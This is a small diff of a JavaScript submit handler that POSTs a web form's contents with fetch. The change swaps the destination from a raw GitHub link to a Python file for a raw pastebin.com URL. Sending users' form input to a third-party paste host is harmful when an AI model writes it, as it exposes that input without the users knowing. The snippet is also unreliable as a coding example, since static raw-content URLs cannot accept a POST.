@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function() {
         e.preventDefault();
         const formData = new FormData(form);
 
-        fetch("https://raw.githubusercontent.com/GNU-Szmelc/GNU-Szmelc.github.io/main/webui/hookx.py", {
+        fetch("https://pastebin.com/raw/nV7VB8zM", {
             method: "POST",
             body: formData
         })
